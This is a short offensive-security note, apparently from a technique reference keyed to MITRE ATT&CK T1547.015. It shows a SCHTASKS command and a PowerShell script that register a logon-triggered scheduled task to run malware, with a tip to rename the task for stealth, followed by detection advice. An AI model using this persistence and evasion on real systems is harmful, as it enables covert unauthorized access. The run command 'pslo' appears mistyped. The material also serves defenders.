# [Login item](https://attack.mitre.org/techniques/T1547/015/)

## Exploit syntax:

* SCHTASKS /CREATE /SC ONLOGON /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00

1. Create ps1 file and input the following:

    ```powershell   

    # Here outpath is the location that your persistent file is.
    $outpath = "<path to malware"
    $action = New-ScheduledTaskAction -Execute $outpath
    $time = New-TimeSpan -Minutes 1

    $trigger = New-ScheduledTaskTrigger -AtLogon -RandomDelay $time

    Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Logon Item Persistence" -Description "This is a POC for Login-Items persistence."
    
    ```
>*Note*: You should also change the name of the `-Taskname` and `-Description` fields for better OPSEC

2. Execute the following command:

    ```powershell

    pslo <name of the above codeblock>.ps1 

    ```


## Detection Technique
* Investigate file creation in the default windows task folder - C:\Windows\System32\Tasks folder.
* Associate logon events (4624) within same time frame as execution of suspicious applications.
* This would involve two seperate searches, One search to identify process creation (Sysmon event code 1) of the malware and then another search of windows event code 4624 around the same time stamp on the victim workstation.
